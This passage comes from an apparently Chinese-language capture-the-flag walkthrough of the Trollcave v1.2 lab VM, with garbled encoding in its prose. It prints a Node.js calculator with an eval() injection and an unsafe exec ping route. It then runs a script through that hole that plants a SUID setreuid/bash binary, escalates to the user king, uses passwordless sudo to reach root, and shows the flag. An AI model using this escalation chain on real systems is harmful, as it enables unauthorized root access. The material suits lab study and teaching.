class="line">/usr/src/linux-headers-4.4.0-116-generic/include/config/can/calc</span><br><span class="line">/usr/src/linux-headers-4.4.0-97-generic/include/config/can/calc</span><br><span class="line">/home/king/calc</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹calcï¼Œå‘ç°é‡Œé¢æœ‰ä¸ªcalc.jsï¼Œå…¶ä¸­çš„å†…å®¹ä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">rails@trollcave:~$ cat /home/king/calc/calc.js </span><br><span class="line">var http = require(&quot;http&quot;);</span><br><span class="line">var url = require(&quot;url&quot;);</span><br><span class="line">var sys = require(&#x27;sys&#x27;);</span><br><span class="line">var exec = require(&#x27;child_process&#x27;).exec;//æ­¤å¤„æœ‰å‘½ä»¤æ‰§è¡Œæ¼æ´</span><br><span class="line"></span><br><span class="line">// Start server</span><br><span class="line">function start(route)</span><br><span class="line">&#123;</span><br><span class="line">        function onRequest(request, response)</span><br><span class="line">        &#123;</span><br><span class="line">                var theurl = url.parse(request.url);</span><br><span class="line">                var pathname = theurl.pathname;</span><br><span class="line">                var query = theurl.query; </span><br><span class="line">                console.log(&quot;Request for &quot; + pathname + query + &quot; received.&quot;);</span><br><span class="line">                route(pathname, request, query, response);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">http.createServer(onRequest).listen(8888, &#x27;127.0.0.1&#x27;);</span><br><span class="line">console.log(&quot;Server started&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Route request</span><br><span class="line">function route(pathname, request, query, response)</span><br><span class="line">&#123;</span><br><span class="line">        console.log(&quot;About to route request for &quot; + pathname);</span><br><span class="line">        switch (pathname)</span><br><span class="line">        &#123;</span><br><span class="line">                // security risk</span><br><span class="line">                /*case &quot;/ping&quot;:</span><br><span class="line">                        pingit(pathname, request, query, response);</span><br><span class="line">                        break;  */</span><br><span class="line"></span><br><span class="line">                case &quot;/&quot;:</span><br><span class="line">                        home(pathname, request, query, response);</span><br><span class="line">                        break;</span><br><span class="line"></span><br><span class="line">                case &quot;/calc&quot;:</span><br><span class="line">                        calc(pathname, request, query, response);</span><br><span class="line">                        break;</span><br><span class="line"></span><br><span class="line">                default:</span><br><span class="line">                        console.log(&quot;404&quot;);</span><br><span class="line">                        display_404(pathname, request, response);</span><br><span class="line">                        break;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function home(pathname, request, query, response)</span><br><span class="line">&#123;</span><br><span class="line">        response.end(&quot;&lt;h1&gt;The King&#x27;s Calculator&lt;/h1&gt;&quot; +</span><br><span class="line">                        &quot;&lt;p&gt;Enter your calculation below:&lt;/p&gt;&quot; +</span><br><span class="line">                        &quot;&lt;form action=&#x27;/calc&#x27; method=&#x27;get&#x27;&gt;&quot; +</span><br><span class="line">                                &quot;&lt;input type=&#x27;text&#x27; name=&#x27;sum&#x27; value=&#x27;1+1&#x27;&gt;&quot; +</span><br><span class="line">                                &quot;&lt;input type=&#x27;submit&#x27; value=&#x27;Calculate!&#x27;&gt;&quot; +</span><br><span class="line">                        &quot;&lt;/form&gt;&quot; +</span><br><span class="line">                        &quot;&lt;hr style=&#x27;margin-top:50%&#x27;&gt;&quot; +</span><br><span class="line">                        &quot;&lt;small&gt;&lt;i&gt;Powered by node.js&lt;/i&gt;&lt;/small&gt;&quot;</span><br><span class="line">                        );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function calc(pathname, request, query, response)</span><br><span class="line">&#123;</span><br><span class="line">        sum = query.split(&#x27;=&#x27;)[1];</span><br><span class="line">        console.log(sum)</span><br><span class="line">        response.writeHead(200, &#123;&quot;Content-Type&quot;: &quot;text/plain&quot;&#125;);</span><br><span class="line"></span><br><span class="line">        response.end(eval(sum).toString());//æ­¤å¤„æ‰§è¡Œäº†eval</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function ping(pathname, request, query, response)</span><br><span class="line">&#123;</span><br><span class="line">        ip = query.split(&#x27;=&#x27;)[1];</span><br><span class="line">        console.log(ip)</span><br><span class="line">        response.writeHead(200, &#123;&quot;Content-Type&quot;: &quot;text/plain&quot;&#125;);</span><br><span class="line"></span><br><span class="line">        exec(&quot;ping -c4 &quot; + ip, function(err, stdout, stderr) &#123;</span><br><span class="line">                response.end(stdout);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function display_404(pathname, request, response)</span><br><span class="line">&#123;</span><br><span class="line">        response.write(&quot;&lt;h1&gt;404 Not Found&lt;/h1&gt;&quot;);</span><br><span class="line">        response.end(&quot;I don&#x27;t have that page, sorry!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Start the server and route the requests</span><br><span class="line">start(route);</span><br><span class="line">rails@trollcave:~$ </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç»è¿‡å®¡è®¡å¾—åˆ°var exec &#x3D; require(â€˜child_processâ€™).exec;&#x2F;&#x2F;æ­¤å¤„æœ‰å‘½ä»¤æ‰§è¡Œæ¼æ´</p><p><img src="/bilibiliganb.github.io/2023/10/19/trollcave-v1-2/image-20230628231621733.png" alt="image-20230628231621733"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">rails@trollcave:/tmp$ ls -al</span><br><span class="line">total 56</span><br><span class="line">drwxrwxrwt  9 root  root   4096 Sep  2 17:46 .</span><br><span class="line">drwxr-xr-x 23 root  root   4096 Sep  2  2021 ..</span><br><span class="line">drwxrwxrwt  2 root  root   4096 Sep  2  2021 .font-unix</span><br><span class="line">drwxrwxrwt  2 root  root   4096 Sep  2  2021 .ICE-unix</span><br><span class="line">-rw-r--r--  1 king  king      0 Sep  2 17:46 passwd</span><br><span class="line">-rw-------  1 rails rails 16664 Sep  2 15:40 RackMultipart20210902-1065-1d715xb</span><br><span class="line">drwx------  3 root  root   4096 Sep  2  2021 systemd-private-3102f8c2d65243ab854375d95f3f6255-systemd-timesyncd.service-yaMXNV</span><br><span class="line">drwxrwxrwt  2 root  root   4096 Sep  2  2021 .Test-unix</span><br><span class="line">drwx------  2 root  root   4096 Sep  2  2021 vmware-root</span><br><span class="line">drwxrwxrwt  2 root  root   4096 Sep  2  2021 .X11-unix</span><br><span class="line">drwxrwxrwt  2 root  root   4096 Sep  2  2021 .XIM-unix</span><br><span class="line">rails@trollcave:/tmp$ cat passwd</span><br><span class="line">rails@trollcave:/tmp$ </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å‘ç°æ˜¯kingç”¨æˆ·åˆ›å»ºçš„ï¼Œä½†æ˜¯é‡Œé¢æ²¡æœ‰å†…å®¹</p><p>åœ¨&#x2F;tmpç›®å½•ä¸‹</p><p>åˆ›å»ºä¸€ä¸ª1.sh,å†…å®¹ä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">touch /tmp/123.txt</span><br></pre></td></tr></table></figure><p>chmod 755 1.sh</p><p>æµ‹è¯•æ˜¯å¦èƒ½å¤Ÿè¿è¡Œ</p><p><img src="/bilibiliganb.github.io/2023/10/19/trollcave-v1-2/image-20230628231643157.png" alt="image-20230628231643157"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rails@trollcave:/tmp$ ls</span><br><span class="line">123.txt  1.sh  pass  passwd  RackMultipart20210902-1065-1d715xb  systemd-private-3102f8c2d65243ab854375d95f3f6255-systemd-timesyncd.service-yaMXNV  vmware-root</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆåŠŸè¿è¡Œäº†touchå‘½ä»¤</p><p>é‚£ä¹ˆå¯ä»¥é€šè¿‡suidè¿›è¡Œææƒ</p><p>æŸ¥çœ‹Kingçš„uidå’Œgid</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">rails@trollcave:/tmp$ cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false</span><br><span class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false</span><br><span class="line">syslog:x:104:108::/home/syslog:/bin/false</span><br><span class="line">_apt:x:105:65534::/nonexistent:/bin/false</span><br><span class="line">lxd:x:106:65534::/var/lib/lxd/:/bin/false</span><br><span class="line">messagebus:x:107:111::/var/run/dbus:/bin/false</span><br><span class="line">uuidd:x:108:112::/run/uuidd:/bin/false</span><br><span class="line">dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false</span><br><span class="line">sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">postgres:x:111:116:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash</span><br><span class="line">king:x:1000:1000:King,,,:/home/king:/bin/bash</span><br><span class="line">rails:x:1001:1001::/home/rails:</span><br><span class="line">dragon:x:1002:1002:,,,:/home/dragon:/bin/bash</span><br><span class="line">dave:x:1003:1003:,,,:/home/dave:/bin/bash</span><br><span class="line">coderguy:x:1004:1004:,,,:/home/coderguy:/bin/bash</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Kingçš„uidæ˜¯1000gidæ˜¯1000</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">int main(int argc,char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">setreuid(1000,1000);</span><br><span class="line">execve(&quot;/bin/bash&quot;,NULL,NULL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>gcc king.c -o king</p><p>ç„¶åå°†kingä¸Šä¼ è‡³é¶æœº&#x2F;tmp</p><p>åœ¨1.shä¸­å†™å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">cp /tmp/king /home/king/exp</span><br><span class="line">chmod 4755 /home/king/exp</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨burpè¿è¡Œ1.sh</p><p><img src="/bilibiliganb.github.io/2023/10/19/trollcave-v1-2/image-20230628231705251.png" alt="image-20230628231705251"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rails@trollcave:/tmp$ ls /home/king/</span><br><span class="line">calc  exp</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨expææƒ,æˆåŠŸææƒåˆ°King</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rails@trollcave:/home/king$ ./exp</span><br><span class="line">king@trollcave:/home/king$ </span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢sudoæƒé™,å‘ç°ä¸éœ€è¦å¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">king@trollcave:/home/king$ sudo -l</span><br><span class="line">Matching Defaults entries for king on trollcave:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User king may run the following commands on trollcave:</span><br><span class="line">    (ALL) NOPASSWD: ALL</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆç›´æ¥ææƒåˆ°rootï¼Œè·å–flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">king@trollcave:/home/king$ sudo su -</span><br><span class="line">root@trollcave:~# cat /root/flag.txt </span><br><span class="line">et tu, dragon?</span><br><span class="line"></span><br><span class="line">c0db34ce8adaa7c07d064cc1697e3d7cb8aec9d5a0c4809d5a0c4809b6be23044d15379c5</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h2><p>cve-2017-16995åœ¨è™šæ‹Ÿæœºå®‰è£…æœ‰æ•…éšœçš„æ—¶å€™ä¼šææƒå¤±è´¥ã€‚suidææƒæ˜¯éœ€è¦å¯¹åº”æƒé™çš„ç”¨æˆ·çš„å‘½ä»¤ã€‚chmod 4755ä¸chmod 755 çš„åŒºåˆ«åœ¨äºå¼€å¤´å¤šäº†ä¸€ä½ï¼Œè¿™ä¸ª4è¡¨ç¤ºå…¶ä»–ç”¨æˆ·æ‰§è¡Œæ–‡ä»¶æ—¶ï¼Œå…·æœ‰ä¸æ‰€æœ‰è€…ç›¸å½“çš„æƒé™ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
